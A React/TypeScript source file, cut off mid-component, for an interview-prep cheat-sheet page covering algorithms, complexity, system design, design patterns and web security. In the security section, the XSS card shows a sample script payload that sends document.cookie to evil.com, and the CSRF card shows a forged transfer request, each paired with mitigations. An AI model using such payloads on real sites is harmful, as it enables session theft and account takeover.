import { useState } from 'react';
import { AppShell } from '../components/AppShell';
import { Icon } from '../components/Icon';
import { useUser } from '../contexts/UserContext';

// ─── Types ────────────────────────────────────────────────────────────────────

interface Card {
  id: string;
  title: string;
  tags: string[];
  complexity?: { time: string; space: string };
  content: string;
  code?: string;
  tip?: string;
}

interface Sheet {
  id: string;
  title: string;
  icon: string;
  color: string;
  bg: string;
  desc: string;
  cards: Card[];
}

// ─── Data ─────────────────────────────────────────────────────────────────────

const SHEETS: Sheet[] = [
  {
    id: 'patterns',
    title: 'Algorithm Patterns',
    icon: 'pattern',
    color: 'text-blue-400',
    bg: 'bg-blue-500/10',
    desc: '14 must-know patterns for cracking any DSA interview',
    cards: [
      {
        id: 'two-pointer',
        title: 'Two Pointers',
        tags: ['Arrays', 'Strings', 'O(n)'],
        complexity: { time: 'O(n)', space: 'O(1)' },
        content: 'Use when searching pairs in a sorted array or checking if a string is a palindrome. One pointer starts at the beginning, another at the end — they converge.',
        code: `// Pair with target sum (sorted array)
function pairSum(arr: number[], target: number) {
  let left = 0, right = arr.length - 1;
  while (left < right) {
    const sum = arr[left]! + arr[right]!;
    if (sum === target) return [left, right];
    sum < target ? left++ : right--;
  }
  return [];
}`,
        tip: 'Trigger: "sorted array", "pair", "palindrome", "in-place"',
      },
      {
        id: 'sliding-window',
        title: 'Sliding Window',
        tags: ['Arrays', 'Strings', 'Subarrays'],
        complexity: { time: 'O(n)', space: 'O(1) or O(k)' },
        content: 'Maintains a window of elements. Expand right to grow, shrink left when constraint violated. Use for max/min subarray or substring problems.',
        code: `// Longest substring with K distinct chars
function longestK(s: string, k: number): number {
  const freq = new Map<string, number>();
  let left = 0, max = 0;
  for (let right = 0; right < s.length; right++) {
    freq.set(s[right]!, (freq.get(s[right]!) ?? 0) + 1);
    while (freq.size > k) {
      const c = s[left++]!;
      const count = freq.get(c)! - 1;
      count === 0 ? freq.delete(c) : freq.set(c, count);
    }
    max = Math.max(max, right - left + 1);
  }
  return max;
}`,
        tip: 'Trigger: "subarray/substring", "at most K", "contiguous"',
      },
      {
        id: 'fast-slow',
        title: 'Fast & Slow Pointers',
        tags: ['Linked List', 'Cycle Detection'],
        complexity: { time: 'O(n)', space: 'O(1)' },
        content: `Floyd's cycle detection. Slow moves 1 step, fast moves 2. If they meet, there's a cycle. Slow pointer at head + meeting point both at cycle start.`,
        code: `// Detect cycle in linked list
function hasCycle(head: ListNode | null): boolean {
  let slow = head, fast = head;
  while (fast && fast.next) {
    slow = slow!.next;
    fast = fast.next.next;
    if (slow === fast) return true;
  }
  return false;
}`,
        tip: 'Trigger: "cycle", "find middle", "kth from end"',
      },
      {
        id: 'merge-intervals',
        title: 'Merge Intervals',
        tags: ['Sorting', 'Greedy'],
        complexity: { time: 'O(n log n)', space: 'O(n)' },
        content: 'Sort by start time. Compare each interval with the last merged one. If overlapping (start ≤ last end), extend the end.',
        code: `function merge(intervals: number[][]): number[][] {
  intervals.sort((a, b) => a[0]! - b[0]!);
  const result: number[][] = [intervals[0]!];
  for (let i = 1; i < intervals.length; i++) {
    const last = result.at(-1)!;
    if (intervals[i]![0]! <= last[1]!) {
      last[1] = Math.max(last[1]!, intervals[i]![1]!);
    } else {
      result.push(intervals[i]!);
    }
  }
  return result;
}`,
        tip: 'Trigger: "overlapping intervals", "scheduling", "meeting rooms"',
      },
      {
        id: 'bfs',
        title: 'BFS (Breadth-First Search)',
        tags: ['Trees', 'Graphs', 'Shortest Path'],
        complexity: { time: 'O(V + E)', space: 'O(V)' },
        content: 'Level-by-level traversal using a queue. Use for shortest path in unweighted graph, level-order traversal, and finding nearest neighbors.',
        code: `function bfs(graph: Map<number, number[]>, start: number) {
  const visited = new Set([start]);
  const queue = [start];
  const order: number[] = [];
  while (queue.length) {
    const node = queue.shift()!;
    order.push(node);
    for (const neighbor of graph.get(node) ?? []) {
      if (!visited.has(neighbor)) {
        visited.add(neighbor);
        queue.push(neighbor);
      }
    }
  }
  return order;
}`,
        tip: 'Trigger: "shortest path", "level order", "nearest"',
      },
      {
        id: 'dfs',
        title: 'DFS (Depth-First Search)',
        tags: ['Trees', 'Graphs', 'Backtracking'],
        complexity: { time: 'O(V + E)', space: 'O(V)' },
        content: 'Explores as deep as possible before backtracking. Use for cycle detection, topological sort, connected components, and island counting.',
        code: `function dfs(graph: Map<number, number[]>, node: number, visited = new Set<number>()): void {
  visited.add(node);
  for (const neighbor of graph.get(node) ?? []) {
    if (!visited.has(neighbor)) dfs(graph, neighbor, visited);
  }
}

// Count islands (grid DFS)
function numIslands(grid: string[][]): number {
  let count = 0;
  for (let r = 0; r < grid.length; r++)
    for (let c = 0; c < grid[0]!.length; c++)
      if (grid[r]![c] === '1') { count++; sink(grid, r, c); }
  return count;
}
function sink(g: string[][], r: number, c: number) {
  if (r < 0 || c < 0 || r >= g.length || c >= g[0]!.length || g[r]![c] !== '1') return;
  g[r]![c] = '0';
  [[-1,0],[1,0],[0,-1],[0,1]].forEach(([dr, dc]) => sink(g, r+dr!, c+dc!));
}`,
        tip: 'Trigger: "number of islands", "connected components", "path exists"',
      },
      {
        id: 'dp-1d',
        title: 'Dynamic Programming (1D)',
        tags: ['DP', 'Optimization'],
        complexity: { time: 'O(n)', space: 'O(n) or O(1)' },
        content: 'Build solution bottom-up from base cases. Each dp[i] represents the optimal answer for subproblem of size i. Coin Change, House Robber, Climbing Stairs.',
        code: `// House Robber — max loot without adjacent houses
function rob(nums: number[]): number {
  if (nums.length === 1) return nums[0]!;
  let prev2 = 0, prev1 = 0;
  for (const n of nums) {
    const curr = Math.max(prev1, prev2 + n);
    prev2 = prev1;
    prev1 = curr;
  }
  return prev1;
}

// Coin Change — min coins to make amount
function coinChange(coins: number[], amount: number): number {
  const dp = Array(amount + 1).fill(Infinity);
  dp[0] = 0;
  for (let i = 1; i <= amount; i++)
    for (const c of coins)
      if (c <= i) dp[i] = Math.min(dp[i]!, dp[i - c]! + 1);
  return dp[amount] === Infinity ? -1 : dp[amount]!;
}`,
        tip: 'Trigger: "min/max", "count ways", "can you reach", "overlapping subproblems"',
      },
      {
        id: 'binary-search',
        title: 'Binary Search',
        tags: ['Sorted Arrays', 'O(log n)'],
        complexity: { time: 'O(log n)', space: 'O(1)' },
        content: 'Works on sorted data. Eliminate half the search space each iteration. Use templates carefully: lo < hi vs lo ≤ hi affects termination.',
        code: `// Classic binary search
function search(nums: number[], target: number): number {
  let lo = 0, hi = nums.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (nums[mid] === target) return mid;
    nums[mid]! < target ? (lo = mid + 1) : (hi = mid - 1);
  }
  return -1;
}

// Search in rotated sorted array
function searchRotated(nums: number[], target: number): number {
  let lo = 0, hi = nums.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (nums[mid] === target) return mid;
    if (nums[lo]! <= nums[mid]!) {
      (target >= nums[lo]! && target < nums[mid]!) ? (hi = mid - 1) : (lo = mid + 1);
    } else {
      (target > nums[mid]! && target <= nums[hi]!) ? (lo = mid + 1) : (hi = mid - 1);
    }
  }
  return -1;
}`,
        tip: 'Trigger: "sorted", "find position", "minimum in rotated", "kth smallest"',
      },
      {
        id: 'heap',
        title: 'Heap / Priority Queue',
        tags: ['Top K', 'Greedy', 'Median'],
        complexity: { time: 'O(n log k)', space: 'O(k)' },
        content: 'Min-heap gives smallest element in O(1). Use for "Top K", K closest points, merge K sorted lists, sliding window median.',
        code: `// Top K frequent elements
function topKFrequent(nums: number[], k: number): number[] {
  const freq = new Map<number, number>();
  for (const n of nums) freq.set(n, (freq.get(n) ?? 0) + 1);

  // Bucket sort by frequency — O(n)
  const buckets: number[][] = Array(nums.length + 1).fill(null).map(() => []);
  for (const [num, count] of freq) buckets[count]!.push(num);

  const result: number[] = [];
  for (let i = buckets.length - 1; i >= 0 && result.length < k; i--)
    result.push(...buckets[i]!);
  return result.slice(0, k);
}`,
        tip: 'Trigger: "top K", "K largest/smallest", "median", "merge K sorted"',
      },
      {
        id: 'backtracking',
        title: 'Backtracking',
        tags: ['Recursion', 'Permutations', 'Combinations'],
        complexity: { time: 'O(2^n) or O(n!)', space: 'O(n)' },
        content: 'Explore all possibilities recursively. At each step: choose, explore, unchoose. Prune branches early when constraint is violated.',
        code: `// All subsets (power set)
function subsets(nums: number[]): number[][] {
  const result: number[][] = [];
  function bt(start: number, curr: number[]) {
    result.push([...curr]);
    for (let i = start; i < nums.length; i++) {
      curr.push(nums[i]!);
      bt(i + 1, curr);
      curr.pop();
    }
  }
  bt(0, []);
  return result;
}

// N-Queens (constraint pruning)
function solveNQueens(n: number): string[][] {
  const result: string[][] = [];
  const cols = new Set<number>(), d1 = new Set<number>(), d2 = new Set<number>();
  function bt(row: number, board: number[]) {
    if (row === n) {
      result.push(board.map((c) => '.'.repeat(c) + 'Q' + '.'.repeat(n - c - 1)));
      return;
    }
    for (let c = 0; c < n; c++) {
      if (cols.has(c) || d1.has(row - c) || d2.has(row + c)) continue;
      cols.add(c); d1.add(row - c); d2.add(row + c);
      bt(row + 1, [...board, c]);
      cols.delete(c); d1.delete(row - c); d2.delete(row + c);
    }
  }
  bt(0, []);
  return result;
}`,
        tip: 'Trigger: "all combinations", "permutations", "N-Queens", "generate all"',
      },
    ],
  },
  {
    id: 'complexity',
    title: 'Big-O Cheat Sheet',
    icon: 'speed',
    color: 'text-green-400',
    bg: 'bg-green-500/10',
    desc: 'Time and space complexity of common data structures and algorithms',
    cards: [
      {
        id: 'ds-complexity',
        title: 'Data Structure Operations',
        tags: ['Reference'],
        content: 'Time complexity of the most common data structure operations:',
        code: `// Arrays
Access:  O(1)   Search: O(n)   Insert: O(n)   Delete: O(n)

// Hash Map
Access:  O(1)   Search: O(1)   Insert: O(1)   Delete: O(1)
Worst case: O(n) due to collisions

// Linked List
Access:  O(n)   Search: O(n)   Insert: O(1)   Delete: O(1)

// Binary Search Tree (balanced)
Access:  O(log n)  Search: O(log n)  Insert: O(log n)  Delete: O(log n)

// Heap (Min/Max)
Peek:    O(1)   Insert: O(log n)   Extract: O(log n)   Build: O(n)

// Stack / Queue
Push/Enqueue: O(1)   Pop/Dequeue: O(1)   Peek: O(1)`,
        tip: 'For interviews: always state the expected case. Mention worst-case when it differs.',
      },
      {
        id: 'sorting-complexity',
        title: 'Sorting Algorithms',
        tags: ['Sorting', 'Comparison'],
        content: 'Know time/space complexity and stability of each sort:',
        code: `// Comparison-based sorts
QuickSort:     avg O(n log n)  worst O(n²)  space O(log n)  NOT stable
MergeSort:     O(n log n)      always        space O(n)      STABLE
HeapSort:      O(n log n)      always        space O(1)      NOT stable
TimSort:       O(n log n)      O(n) best     space O(n)      STABLE ← Python/Java default

// Linear sorts (beat comparison lower bound O(n log n))
CountingSort:  O(n + k)  space O(k)   — works when range is known
RadixSort:     O(nk)     space O(n+k) — digit by digit
BucketSort:    O(n)      avg           — uniform distribution

// Simple but slow
BubbleSort:    O(n²)     O(n) best    space O(1)      STABLE
InsertionSort: O(n²)     O(n) best    space O(1)      STABLE ← best for small/nearly-sorted`,
        tip: 'Interviewers love when you mention: "JS .sort() uses TimSort which is O(n log n) and stable"',
      },
      {
        id: 'graph-complexity',
        title: 'Graph Algorithms',
        tags: ['Graphs', 'Shortest Path'],
        content: 'Time complexities for the most common graph algorithms:',
        code: `// V = vertices, E = edges

BFS:            O(V + E)    space O(V)  — unweighted shortest path
DFS:            O(V + E)    space O(V)  — cycle detection, topological sort
Dijkstra:       O((V+E) log V)  with min-heap  — weighted shortest path (no negative)
Bellman-Ford:   O(VE)       — negative edges, detect negative cycles
Floyd-Warshall: O(V³)       — all-pairs shortest path
Topological Sort (Kahn's): O(V + E)    — DAG, BFS-based
Union-Find:     O(α(n)) ≈ O(1) amortized  — with path compression + rank`,
        tip: 'Dijkstra fails with negative edges — use Bellman-Ford instead',
      },
      {
        id: 'dp-complexity',
        title: 'DP Problem Templates',
        tags: ['DP', 'Common Patterns'],
        content: 'Common DP patterns with their complexities:',
        code: `// 1D DP: dp[i] depends on dp[i-1] or dp[i-2]
// Examples: Fibonacci, Climbing Stairs, House Robber
// Time: O(n), Space: O(1) with rolling variables

// 2D DP: dp[i][j] — grid or two sequence problems
// Examples: LCS, Edit Distance, Unique Paths, Knapsack 0/1
// Time: O(m×n), Space: O(m×n) or O(n) with row compression

// Interval DP: dp[i][j] — range/palindrome problems
// Examples: Matrix Chain Multiplication, Burst Balloons
// Time: O(n³), Space: O(n²)

// Bitmask DP: dp[mask][i] — subset problems
// Examples: TSP, Optimal Assignment
// Time: O(2^n × n), Space: O(2^n × n)`,
        tip: 'In interviews: start with brute force O(2^n), show memoization O(n) insight to impress.',
      },
    ],
  },
  {
    id: 'system-design',
    title: 'System Design Cards',
    icon: 'architecture',
    color: 'text-purple-400',
    bg: 'bg-purple-500/10',
    desc: 'Key concepts, trade-offs, and interview frameworks',
    cards: [
      {
        id: 'sd-framework',
        title: 'RESHADED Framework',
        tags: ['Interview Framework'],
        content: 'Structured 8-step approach for any system design interview:',
        code: `R — Requirements: Functional (what it does) + Non-functional (latency, scale)
E — Estimation: DAU → QPS → storage → bandwidth
S — Storage: SQL vs NoSQL, schema, indexes, sharding
H — High-level design: Core services, load balancers, caches
A — API design: REST endpoints, request/response schemas
D — Detailed design: Deep dive on 2-3 critical components
E — Evaluate: Bottlenecks, single points of failure, trade-offs
D — Discuss: Monitoring, alerting, disaster recovery, cost

// Example: Design Twitter Feed
// DAU: 100M users | 10% active/day = 10M DAU
// Read QPS: 10M × 10 reads/day / 86400 ≈ 1157 QPS (peak × 3 = 3500 QPS)
// Write QPS: 10M × 1 tweet/day / 86400 ≈ 116 QPS
// Storage: 100 bytes/tweet × 116 QPS × 86400 × 365 ≈ 3.6 TB/year`,
        tip: 'Spend 5 minutes on requirements. Interviewers want to see you clarify, not assume.',
      },
      {
        id: 'cap-theorem',
        title: 'CAP Theorem',
        tags: ['Distributed Systems', 'Trade-offs'],
        content: 'A distributed system can only guarantee 2 of 3: Consistency, Availability, Partition Tolerance. Since network partitions always happen, you choose CP or AP.',
        code: `CP systems (Consistency + Partition Tolerance):
  HBase, Zookeeper, MongoDB (default config)
  → Returns error instead of stale data
  → Use when: banking, transactions, inventory

AP systems (Availability + Partition Tolerance):
  Cassandra, CouchDB, DynamoDB
  → Returns possibly stale data, eventually consistent
  → Use when: social feeds, product catalog, DNS

// Key questions for interviews:
// "Can you tolerate stale reads?" → AP
// "Is strong consistency required?" → CP
// "What are the consistency guarantees?" → Eventual vs Strong vs Causal`,
        tip: 'Most NoSQL databases are AP. Most relational DBs with replication are CP.',
      },
      {
        id: 'caching',
        title: 'Caching Strategies',
        tags: ['Performance', 'Redis'],
        content: 'Caching reduces database load and latency. Choose the right strategy based on read/write patterns.',
        code: `// Cache-Aside (Lazy Loading) — most common
1. Read from cache
2. Miss? Read from DB, write to cache, return
Pros: Only caches requested data, resilient to cache failure
Cons: Cache miss penalty, potential stale data

// Write-Through
1. Write to cache AND DB simultaneously
Pros: No stale data, consistent
Cons: Extra write latency, unused data also cached

// Write-Behind (Write-Back)
1. Write to cache, async write to DB
Pros: Reduced DB load on writes
Cons: Risk of data loss on cache failure

// Eviction Policies:
LRU (Least Recently Used) — most popular
LFU (Least Frequently Used) — hot data stays longer
TTL (Time To Live) — automatic expiry

// Cache-busting on updates:
Option 1: Delete cache key on write → next read refreshes
Option 2: Versioned keys: user:42:v3 → v4 on update`,
        tip: 'State your eviction policy and TTL in interviews — shows you think about staleness.',
      },
      {
        id: 'load-balancing',
        title: 'Load Balancing & Consistent Hashing',
        tags: ['Scalability', 'Distribution'],
        content: 'Distribute requests across servers. Consistent hashing minimizes re-distribution when nodes join/leave.',
        code: `// Load Balancing Algorithms:
Round Robin         → sequential, equal load
Weighted Round Robin → by server capacity
Least Connections   → send to server with fewest active connections
IP Hash             → same client → same server (sticky sessions)
Random              → random server selection

// Consistent Hashing (used by: DynamoDB, Cassandra, Redis Cluster):
- Map servers to a ring of 2^32 positions using hash(server_id)
- Map requests to ring using hash(request_key)
- Find next clockwise server
- Adding/removing a server only remaps O(K/N) keys
  where K = total keys, N = number of nodes

// Virtual Nodes:
- Each server gets multiple ring positions (e.g., 150 vnodes)
- Distributes load more evenly
- Reduces "hot spot" effect when one server is overloaded`,
        tip: 'Consistent hashing is used in: CDN, distributed cache, database sharding.',
      },
      {
        id: 'database-scaling',
        title: 'Database Scaling Patterns',
        tags: ['Databases', 'Sharding', 'Replication'],
        content: 'Scale databases vertically (bigger server) or horizontally (more servers via replication/sharding).',
        code: `// Read Replicas (Master-Slave Replication)
- All writes → primary (master)
- Reads distributed across replicas
- Replication lag: replicas may be slightly behind
- Use for: read-heavy workloads, analytics, reporting

// Sharding (Horizontal Partitioning)
- Split data across multiple DBs by shard key
- Hash sharding: hash(user_id) % num_shards
- Range sharding: user_id 0-1M → shard1, 1M-2M → shard2
- Directory sharding: lookup table maps key → shard

// Sharding challenges:
- Cross-shard joins become expensive or impossible
- Rebalancing when adding shards
- Distributed transactions are hard

// Denormalization:
- Store redundant data to avoid joins
- Trade: write complexity, storage cost for read speed
- Example: store author_name in posts table instead of joining users

// CQRS + Event Sourcing:
- Separate Read model (optimized for queries) and Write model
- Write model stores events, Read model materializes state`,
        tip: 'Always shard by access pattern. A bad shard key causes hot spots.',
      },
    ],
  },
  {
    id: 'oop-patterns',
    title: 'Design Pattern Quick Ref',
    icon: 'account_tree',
    color: 'text-amber-400',
    bg: 'bg-amber-500/10',
    desc: 'When to use each of the 23 GoF design patterns',
    cards: [
      {
        id: 'creational',
        title: 'Creational Patterns',
        tags: ['OOP', 'Creation'],
        content: 'Control object creation. The right pattern depends on WHO decides the type and HOW complex the creation is.',
        code: `Singleton    — 1 instance, global access point
               When: shared resource (DB conn, config, logger)
               Watch: hidden dependencies, makes testing hard

Factory Method — subclass decides which class to instantiate
               When: framework code that shouldn't know concrete types
               Example: UI toolkit, document creator

Abstract Factory — create families of related objects
               When: system must be independent of how products are created
               Example: UI kit (Button, TextField) for Windows vs macOS

Builder       — step-by-step construction of complex objects
               When: many optional params (telescoping constructor problem)
               Example: QueryBuilder, HtmlBuilder

Prototype     — clone existing object
               When: creating object is expensive, need copies with small changes
               Example: game units, document templates`,
        tip: 'Builder is the modern alternative to constructor with 5+ parameters.',
      },
      {
        id: 'structural',
        title: 'Structural Patterns',
        tags: ['OOP', 'Composition'],
        content: 'Compose classes and objects into larger structures while keeping them flexible.',
        code: `Adapter      — convert interface A to interface B
               When: integrating incompatible third-party libraries
               Example: different payment gateway SDKs behind one interface

Bridge       — decouple abstraction from implementation
               When: both abstraction and implementation need to vary independently
               Example: Shape (Circle, Square) × Renderer (SVG, Canvas)

Composite    — tree structure, treat leaf = composite
               When: hierarchical data (file system, org charts, UI trees)
               Example: HTML DOM, file/folder

Decorator    — add behavior without subclassing (composition > inheritance)
               When: need to add optional features at runtime
               Example: coffee + milk + sugar, streams with buffering/compression

Facade       — simplified interface to complex subsystem
               When: library is complex, hide it behind a simple API
               Example: Startup class that initializes framework, DB, cache

Proxy        — control access to another object
               When: lazy loading, access control, caching, logging
               Example: ORM lazy loading, API rate limiting proxy`,
        tip: 'Decorator ≠ inheritance. You wrap objects, not subclass them.',
      },
      {
        id: 'behavioral',
        title: 'Behavioral Patterns',
        tags: ['OOP', 'Communication'],
        content: 'How objects communicate and distribute responsibility.',
        code: `Observer     — one-to-many: notify dependents on state change
               When: event systems, reactive UIs, pub/sub
               Example: React state → component re-render

Strategy     — swap algorithms at runtime
               When: multiple algorithms for same task, selectable at runtime
               Example: sort strategy, payment method, compression

Command      — encapsulate request as object
               When: undo/redo, queuing, logging, transactions
               Example: Ctrl+Z, job scheduler, remote procedure

Iterator     — sequential access without exposing implementation
               When: traversing different collections uniformly
               Example: for...of in JS, database cursor

State        — object behavior changes with its state
               When: finite state machine, object with distinct modes
               Example: traffic light, order lifecycle, UI wizard

Template Method — skeleton in base class, steps in subclasses
               When: algorithm has fixed structure, variable steps
               Example: data import pipeline, test framework setup/teardown

Chain of Responsibility — pass request along chain of handlers
               When: multiple handlers, don't know which handles it
               Example: middleware (Express), event bubbling, CORS headers`,
        tip: 'Observer = push (subject notifies). Iterator = pull (client requests next).',
      },
    ],
  },
  {
    id: 'security',
    title: 'Security Quick Reference',
    icon: 'shield',
    color: 'text-red-400',
    bg: 'bg-red-500/10',
    desc: 'OWASP Top 10, attack vectors, and secure coding rules',
    cards: [
      {
        id: 'owasp',
        title: 'OWASP Top 10 (2021)',
        tags: ['OWASP', 'Web Security'],
        content: 'The most critical security risks in web applications:',
        code: `A01 — Broken Access Control       ← #1, most common
      Mitigation: Deny by default, check every request server-side

A02 — Cryptographic Failures       (was Sensitive Data Exposure)
      Mitigation: TLS everywhere, bcrypt for passwords, no MD5/SHA1

A03 — Injection (SQLi, NoSQLi, OS, LDAP)
      Mitigation: Parameterized queries, ORMs, input validation

A04 — Insecure Design              (new in 2021)
      Mitigation: Threat modeling, security requirements up front

A05 — Security Misconfiguration
      Mitigation: Least privilege, disable defaults, patch regularly

A06 — Vulnerable and Outdated Components
      Mitigation: SCA tools (Snyk, npm audit), update dependencies

A07 — Identification & Authentication Failures
      Mitigation: MFA, rate limiting, secure session management

A08 — Software & Data Integrity Failures (new)
      Mitigation: Verify integrity of updates, CI/CD pipeline security

A09 — Security Logging & Monitoring Failures
      Mitigation: Log auth events, alert on anomalies, retain logs

A10 — Server-Side Request Forgery (SSRF) (new)
      Mitigation: Allowlist internal services, block 169.254.x.x`,
        tip: 'In interviews: IDOR (A01) and SQLi (A03) are the most common real-world vulnerabilities.',
      },
      {
        id: 'auth-security',
        title: 'Authentication & JWT Security',
        tags: ['Auth', 'JWT', 'Sessions'],
        content: 'Secure authentication patterns and common JWT pitfalls:',
        code: `// JWT Structure: header.payload.signature (Base64URL encoded)
// header: { alg: "HS256", typ: "JWT" }
// payload: { sub: "userId", iat: 1234, exp: 1234+3600 }
// signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)

// Common JWT vulnerabilities:
1. alg=none attack — always verify algorithm explicitly
2. Weak secret — use 256-bit random secret, not "secret123"
3. No expiry (exp) — always set short TTL (15min access, 7d refresh)
4. Sensitive data in payload — payload is base64, NOT encrypted

// Secure token storage:
HttpOnly Cookie (CSRF risk, use SameSite=Strict)
Memory (lost on refresh, best XSS protection)
localStorage (XSS risk — avoid for sensitive tokens)

// Refresh token rotation:
- Access token: short-lived (15 min)
- Refresh token: long-lived (7 days), stored HttpOnly
- On refresh: issue new refresh token, invalidate old one`,
        tip: 'Never store tokens in localStorage in production. Prefer HttpOnly + SameSite cookies.',
      },
      {
        id: 'xss-csrf',
        title: 'XSS vs CSRF',
        tags: ['XSS', 'CSRF', 'Web Security'],
        content: 'Two of the most misunderstood client-side attacks:',
        code: `// XSS (Cross-Site Scripting) — attacker runs JS in victim's browser
// Attack: inject <script>fetch('evil.com/steal?c='+document.cookie)</script>
// Types:
//   Stored XSS  — malicious script saved in DB (blog comments)
//   Reflected   — script in URL parameter, reflected in response
//   DOM-based   — script in client-side code (document.write(location.hash))
// Mitigation:
//   1. Escape output: & → &amp; < → &lt; > → &gt;
//   2. Content Security Policy: Content-Security-Policy: script-src 'self'
//   3. HttpOnly cookies (can't be stolen by JS)
//   4. Input sanitization (DOMPurify for rich text)

// CSRF (Cross-Site Request Forgery) — attacker tricks user's browser to make requests
// Attack: <img src="bank.com/transfer?to=attacker&amount=1000">
//   victim's browser sends cookies automatically → authenticated request!
// Mitigation:
//   1. CSRF token (double-submit cookie or synchronizer token)
//   2. SameSite=Strict cookies (modern browsers block cross-site requests)
//   3. Check Origin/Referer headers
//   4. Require re-authentication for sensitive actions`,
        tip: 'XSS = attacker steals victim data. CSRF = attacker uses victim identity. Different!',
      },
    ],
  },
];

// ─── Component ────────────────────────────────────────────────────────────────

function CodeBlock({ code }: { code: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(code).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <div className="relative mt-3">
      <button
        type="button"
        onClick={copy}
        className="absolute top-2 right-2 p-1.5 rounded-lg bg-zinc-700/50 hover:bg-zinc-600/50 transition-colors"
        title="Copy code"
      >
        <Icon name={copied ? 'check' : 'content_copy'} size={13} className={copied ? 'text-green-400' : 'text-zinc-400'} />
      </button>
      <pre className="bg-[#0e0e0e] border border-white/8 rounded-xl p-4 text-xs text-zinc-300 overflow-x-auto leading-relaxed font-mono whitespace-pre">
        {code}
      </pre>
    </div>
  );
}

function CheatCard({ card, sheetColor }: { card: Card; sheetColor: string }) {
  const [expanded, setExpanded] = useState(false);

  return (
    <div className={`bg-[#1a1a1a] border border-white/8 rounded-2xl overflow-hidden transition-all duration-200 ${expanded ? 'border-white/15' : ''}`}>
      <button
        type="button"
        onClick={() => setExpanded((e) => !e)}
        className="w-full text-left px-5 py-4 flex items-start gap-4 hover:bg-white/3 transition-colors"
      >
        <div className="flex-1 min-w-0">
          <div className="flex items-start gap-2 flex-wrap mb-1">
            <h3 className="font-bold text-white text-sm">{card.title}</h3>
          </div>
          {card.complexity && !expanded && (
            <div className="flex gap-3 mt-1">
              <span className="text-[10px] font-bold text-green-400 bg-green-400/10 px-2 py-0.5 rounded-full">
                Time: {card.complexity.time}
              </span>
              <span className="text-[10px] font-bold text-blue-400 bg-blue-400/10 px-2 py-0.5 rounded-full">
                Space: {card.complexity.space}
              </span>
            </div>
          )}
          {!expanded && (
            <p className="text-zinc-500 text-xs mt-1.5 line-clamp-2">{card.content}</p>
          )}
        </div>
        <div className="flex items-center gap-2 flex-shrink-0">
          <div className="flex gap-1 flex-wrap">
            {card.tags.map((t) => (
              <span key={t} className="text-[9px] font-bold text-zinc-600 bg-zinc-800 px-2 py-0.5 rounded-full uppercase tracking-widest">
                {t}
              </span>
            ))}
          </div>
          <Icon
            name={expanded ? 'keyboard_arrow_up' : 'keyboard_arrow_down'}
            size={18}
            className="text-zinc-500 ml-1"
          />
        </div>
      </button>

      {expanded && (
        <div className="px-5 pb-5 border-t border-white/5 pt-4 space-y-4">
          {card.complexity && (
            <div className="flex gap-3">
              <span className="text-[10px] font-bold text-green-400 bg-green-400/10 px-3 py-1 rounded-full">
                Time: {card.complexity.time}
              </span>
              <span className="text-[10px] font-bold text-blue-400 bg-blue-400/10 px-3 py-1 rounded-full">
                Space: {card.complexity.space}
              </span>
            </div>
          )}

          <p className="text-zinc-300 text-sm leading-relaxed">{card.content}</p>

          {card.code && <CodeBlock code={card.code} />}

          {card.tip && (
            <div className="flex items-start gap-3 bg-[#E82127]/8 border border-[#E82127]/20 rounded-xl px-4 py-3">
              <Icon name="tips_and_updates" size={15} className="text-[#E82127] flex-shrink-0 mt-0.5" />
              <p className="text-zinc-300 text-xs leading-relaxed">{card.tip}</p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export function CheatSheetsPage() {
  const { fireXP } = useUser();
  const [activeSheet, setActiveSheet] = useState(SHEETS[0]!.id);
  const [search, setSearch] = useState('');
  const [xpFired, setXpFired] = useState(false);

  const sheet = SHEETS.find((s) => s.id === activeSheet) ?? SHEETS[0]!;

  const filtered = sheet.cards.filter((c) => {
    if (!search.trim()) return true;
    const q = search.toLowerCase();
    return c.title.toLowerCase().includes(q) ||
      c.content.toLowerCase().includes(q) ||
      c.tags.some((t) => t.toLowerCase().includes(q));
  });

  const handleSheetChange = (id: string) => {
    setActiveSheet(id);
    setSearch('');
    if (!xpFired) {
      fireXP(5, 'Opened cheat sheets!');
      setXpFired(true);
    }
  };

  return (
    <AppShell>
      <div className="pt-6 pb-12 max-w-5xl">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-black tracking-tighter text-white mb-2">
            Cheat <span className="text-[#E82127]">Sheets.</span>
          </h1>
          <p className="text-zinc-400 text-lg">Quick-reference cards for interviews. Copy code, understand patterns.</p>
        </div>

        {/* Sheet selector */}
        <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-5 gap-3 mb-8">
          {SHEETS.map((s) => (
            <button
              key={s.id}
              type="button"
              onClick={() => handleSheetChange(s.id)}
              className={`flex flex-col items-center gap-2 p-4 rounded-2xl border text-center transition-all ${
                activeSheet === s.id
                  ? `${s.bg} border-current/30 ${s.color}`
                  : 'bg-[#1a1a1a] border-white/8 text-zinc-500 hover:border-white/15 hover:text-zinc-300'
              }`}
            >
              <Icon name={s.icon} size={22} />
              <span className="text-[10px] font-bold uppercase tracking-widest leading-tight">{s.title}</span>
            </button>
          ))}
        </div>

        {/* Active sheet header */}
        <div className="flex items-center justify-between mb-6 flex-wrap gap-4">
          <div className="flex items-center gap-3">
            <div className={`w-10 h-10 ${sheet.bg} rounded-xl flex items-center justify-center ${sheet.color} flex-shrink-0`}>
              <Icon name={sheet.icon} size={20} />
            </div>
            <div>
              <h2 className="text-lg font-black text-white">{sheet.title}</h2>
              <p className="text-zinc-500 text-xs">{sheet.desc}</p>
            </div>
          </div>

          {/* Search */}
          <div className="flex items-center gap-2 bg-[#1a1a1a] border border-white/8 rounded-xl px-3 py-2 w-full sm:w-auto max-w-xs">
            <Icon name="search" size={16} className="text-zinc-500 flex-shrink-0" />
            <input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search cards…"
              className="bg-transparent text-white text-sm placeholder:text-zinc-600 focus:outline-none flex-1 min-w-0"
            />
            {search && (
              <button onClick={() => setSearch('')} className="text-zinc-600 hover:text-zinc-400">
                <Icon name="close" size={14} />
              </button>
            )}
          </div>
        </div>

        {/* Cards */}
        <div className="space-y-3">
          {filtered.length === 0 ? (
            <p className="text-zinc-600 text-sm text-center py-12">No cards match "{search}"</p>
          ) : (
